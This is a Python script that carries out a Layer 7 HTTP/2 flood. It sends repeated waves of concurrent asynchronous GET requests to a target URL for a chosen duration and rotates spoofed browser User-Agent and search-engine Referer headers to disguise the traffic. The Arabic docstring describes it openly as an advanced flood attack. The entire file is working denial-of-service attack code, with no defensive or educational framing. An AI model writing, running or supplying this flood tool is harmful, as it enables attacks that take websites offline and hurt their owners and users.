import httpx
import asyncio
import random
import time

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
]

async def send_request(client: httpx.AsyncClient, target_url: str):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": random.choice(REFERERS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
    }
    try:
        response = await client.get(target_url, headers=headers)
        print(f"[HTTP/2] Sent request, status: {response.status_code}")
    except Exception as e:
        print(f"[HTTP/2] Request error: {e}")

async def layer7_http2_flood(target_url: str, duration: int, concurrency: int = 100):
    """
    هجوم Layer7 HTTP/2 Flood متطور باستخدام asyncio و httpx AsyncClient.

    :param target_url: رابط الهدف
    :param duration: مدة الهجوم بالثواني
    :param concurrency: عدد الطلبات المتزامنة
    """
    timeout = time.time() + duration
    async with httpx.AsyncClient(http2=True, timeout=10) as client:
        while time.time() < timeout:
            tasks = []
            for _ in range(concurrency):
                tasks.append(asyncio.create_task(send_request(client, target_url)))
            await asyncio.gather(*tasks)
